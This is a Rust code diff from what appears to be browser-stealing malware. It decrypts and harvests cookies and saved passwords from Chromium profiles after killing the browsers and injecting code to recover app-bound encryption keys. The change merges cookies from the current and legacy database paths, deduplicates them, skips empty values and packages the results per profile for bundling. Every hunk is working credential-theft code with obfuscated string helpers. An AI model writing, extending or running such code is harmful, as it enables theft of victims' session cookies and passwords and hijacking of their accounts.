@@ -112,6 +112,7 @@ pub fn extract_cookies_passwords_from_cache() -> Vec<(String, String)> {
 
 /// Extract all profile data using keys already cached (post-inject / post-kill).
 pub fn extract_all_from_cache() -> Vec<(String, String)> {
+    recover_missing_app_bound_keys();
     let cache = match EXTRACTION_CACHE.lock() {
         Ok(guard) => guard.clone(),
         Err(_) => return Vec::new(),
@@ -140,9 +141,36 @@ pub fn extract_all_from_cache() -> Vec<(String, String)> {
     results
 }
 
+/// Re-extract cookies after all Chromium browsers are killed (DB unlocked).
+pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
+    recover_missing_app_bound_keys();
+    let cache = match EXTRACTION_CACHE.lock() {
+        Ok(guard) => guard.clone(),
+        Err(_) => return Vec::new(),
+    };
+    let Some(cache) = cache else { return Vec::new() };
+
+    let mut results = Vec::new();
+    for (browser_name, cached) in cache {
+        let profiles = get_profiles(&cached.user_data_path, cached.has_profiles);
+        for (profile_name, profile_path) in profiles {
+            let cookies = extract_cookies(&profile_path, &cached.keys);
+            crate::browsers::common::zipp::push_profile_bundle(
+                &mut results,
+                &browser_name,
+                &profile_name,
+                None,
+                cookies,
+                None,
+                None,
+            );
+        }
+    }
+    results
+}
+
 /// Re-extract cookies/passwords after kill; run inject only here (not during parallel scan).
 pub fn extract_post_kill() -> Vec<(String, String)> {
-    recover_missing_app_bound_keys();
     extract_all_from_cache()
 }
 
@@ -174,11 +202,6 @@ fn recover_missing_app_bound_keys() {
             }
         }
     }
-}
-
-/// Re-extract cookies after all browsers are killed (DB unlocked).
-pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
-    extract_post_kill()
 }
 
 /// App-bound key recovery: 1 primary + max 2 fallbacks.
@@ -528,21 +551,68 @@ pub fn extract_passwords(profile_path: &Path, keys: &MasterKeys) -> Option<Strin
 }
 
 pub fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
+    let mut paths = Vec::new();
     let network = s_dir_network();
-    let cookies = s_file_cookies_db();
-    let db_path = if profile_path.join(&network).join(&cookies).exists() {
-        profile_path.join(&network).join(&cookies)
+    let cookies_name = s_file_cookies_db();
+    let network_path = profile_path.join(&network).join(&cookies_name);
+    let legacy_path = profile_path.join(&cookies_name);
+    if network_path.exists() {
+        paths.push(network_path);
+    }
+    if legacy_path.exists() && !paths.contains(&legacy_path) {
+        paths.push(legacy_path);
+    }
+    if paths.is_empty() {
+        return None;
+    }
+
+    let mut merged_body = String::new();
+    let mut seen: std::collections::HashSet<(String, String, String)> = std::collections::HashSet::new();
+    let mut total = 0usize;
+
+    for db_path in paths {
+        let Some(part) = extract_cookies_from_db(&db_path, keys) else {
+            continue;
+        };
+        for line in part.lines() {
+            let t = line.trim();
+            if t.is_empty() || t.starts_with('#') {
+                continue;
+            }
+            let fields: Vec<&str> = t.split('\t').collect();
+            if fields.len() < 7 || fields[6].is_empty() {
+                continue;
+            }
+            let key = (fields[0].to_string(), fields[5].to_string(), fields[2].to_string());
+            if seen.insert(key) {
+                merged_body.push_str(t);
+                merged_body.push('\n');
+                total += 1;
+            }
+        }
+    }
+
+    if total == 0 {
+        None
     } else {
-        profile_path.join(&cookies)
-    };
-    let (conn, temp) = match open_db_robust(&db_path) {
+        crate::browsers::common::nts::build_file(&merged_body)
+    }
+}
+
+fn extract_cookies_from_db(db_path: &Path, keys: &MasterKeys) -> Option<String> {
+    let (conn, temp) = match open_db_robust(db_path) {
         Some((c, t)) => (c, t),
         None => return None,
     };
     let query = s_query_cookies();
     let mut stmt = match conn.prepare(&query) {
         Ok(s) => s,
-        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
+        Err(_) => {
+            if let Some(t) = &temp {
+                cleanup_db(t);
+            }
+            return None;
+        }
     };
     let rows = match stmt.query_map([], |row| {
         let host: String = row.get(0)?;
@@ -556,7 +626,12 @@ pub fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String>
         Ok((host, name, enc_value, plain_value, path, expires, is_secure, is_httponly))
     }) {
         Ok(r) => r,
-        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
+        Err(_) => {
+            if let Some(t) = &temp {
+                cleanup_db(t);
+            }
+            return None;
+        }
     };
     let mut count = 0;
     let mut body = String::new();
@@ -566,6 +641,9 @@ pub fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String>
             continue;
         }
         let value = decrypt_cookie_value(&enc_value, &plain_value, keys);
+        if value.is_empty() {
+            continue;
+        }
         let unix_expires = if expires > 0 {
             (expires / 1_000_000) - 11644473600
         } else {
@@ -582,11 +660,15 @@ pub fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String>
         ));
         count += 1;
     }
-    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
+    drop(stmt);
+    drop(conn);
+    if let Some(t) = &temp {
+        cleanup_db(t);
+    }
     if count == 0 {
         None
     } else {
-        crate::browsers::common::nts::build_file(&body)
+        Some(body)
     }
 }
 
